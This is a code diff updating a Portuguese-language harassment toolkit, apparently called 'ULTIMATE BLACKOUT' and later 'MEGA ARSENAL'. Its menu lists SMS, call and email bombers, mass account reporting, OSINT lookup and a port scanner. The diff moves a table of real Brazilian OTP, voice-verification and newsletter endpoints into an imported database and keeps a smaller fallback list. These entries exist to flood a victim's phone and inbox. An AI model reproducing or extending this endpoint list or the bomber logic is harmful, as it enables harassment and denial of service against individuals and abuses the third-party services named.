@@ -22,13 +22,13 @@ BANNER = f"""
 {Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║{Fore.WHITE}██╔═══╝ ██╔══██║
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║{Fore.WHITE}██║     ██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.WHITE}╚═╝     ╚═╝  ╚═╝
-{Fore.YELLOW}┌─────────────────────────────────────────────────────────┐
-{Fore.YELLOW}│ {Fore.WHITE}[1] SMS Bomber (10 APIs)  {Fore.YELLOW}│{Fore.WHITE} [5] Zap Report (2 métodos){Fore.YELLOW}│
-{Fore.YELLOW}│ {Fore.WHITE}[2] Call Bomber (5 APIs)  {Fore.YELLOW}│{Fore.WHITE} [6] OSINT Deep (70+ sites){Fore.YELLOW}│
-{Fore.YELLOW}│ {Fore.WHITE}[3] Email Bomber (7 APIs) {Fore.YELLOW}│{Fore.WHITE} [7] Port Scanner (14 ports){Fore.YELLOW}│
-{Fore.YELLOW}│ {Fore.WHITE}[4] IG Report (5 motivos) {Fore.YELLOW}│{Fore.WHITE} [0] Exit                   {Fore.YELLOW}│
-{Fore.YELLOW}└─────────────────────────────────────────────────────────┘
-{Fore.WHITE}v14.0 ULTIMATE BLACKOUT EDITION - by Shura
+{Fore.YELLOW}┌──────────────────────────────────────────────────────────┐
+{Fore.YELLOW}│ {Fore.WHITE}[1] SMS Bomber (100+ APIs) {Fore.YELLOW}│{Fore.WHITE} [5] Zap Report (2 métodos){Fore.YELLOW}│
+{Fore.YELLOW}│ {Fore.WHITE}[2] Call Bomber (30+ APIs) {Fore.YELLOW}│{Fore.WHITE} [6] OSINT Deep (70+ sites){Fore.YELLOW}│
+{Fore.YELLOW}│ {Fore.WHITE}[3] Email Bomber (7 APIs)  {Fore.YELLOW}│{Fore.WHITE} [7] Port Scanner (14 ports){Fore.YELLOW}│
+{Fore.YELLOW}│ {Fore.WHITE}[4] IG Report (5 motivos)  {Fore.YELLOW}│{Fore.WHITE} [0] Exit                   {Fore.YELLOW}│
+{Fore.YELLOW}└──────────────────────────────────────────────────────────┘
+{Fore.WHITE}v15.0 MEGA ARSENAL EDITION - by Shura
 """
 
 stats = {"success": 0, "fail": 0}
@@ -50,37 +50,31 @@ def safe_int(p, d):
     try: return int(input(p) or d)
     except: return d
 
-# ========== TODAS AS APIs (22 TOTAL) ==========
-APIS = {
-    "sms": [
-        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
-        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
-        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Uber", "u": "https://auth.uber.com/login/phoneNumber", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "99", "u": "https://api.99app.com/api-passenger/v1/users/phone/verify", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Rappi", "u": "https://services.rappi.com.br/api/rocket/v2/guest/verify-phone", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Americanas", "u": "https://www.americanas.com.br/api/v1/customer/otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "MercadoLivre", "u": "https://www.mercadolivre.com.br/jms/mlb/lgz/login", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
-    ],
-    "call": [
-        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
-        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Nubank", "u": "https://prod-s0-webapp-proxy.nubank.com.br/api/token", "d": {"phone": "{T}", "type": "voice"}, "h": {"Content-Type": "application/json"}},
-        {"n": "PicPay", "u": "https://api.picpay.com/v2/auth/send-otp", "d": {"phone": "{T}", "channel": "voice"}, "h": {"Content-Type": "application/json"}}
-    ],
-    "email": [
-        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
-        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Canaltech", "u": "https://canaltech.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Olhardigital", "u": "https://olhardigital.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}}
-    ]
-}
+# ========== IMPORTAR APIS ==========
+try:
+    from apis_db import APIS
+    log(f"APIs carregadas: {len(APIS['sms'])} SMS | {len(APIS['call'])} Call | {len(APIS['email'])} Email", "i")
+except ImportError:
+    log("Erro ao carregar apis_db.py! Usando APIs padrão...", "e")
+    APIS = {
+        "sms": [
+            {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
+            {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
+            {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
+            {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
+            {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
+        ],
+        "call": [
+            {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
+            {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
+            {"n": "iFood", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
+        ],
+        "email": [
+            {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
+            {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
+        ]
+    }
+
 
 # ========== ASYNC BOMBER ==========
 async def bomber_async(target, mode, qty, threads):
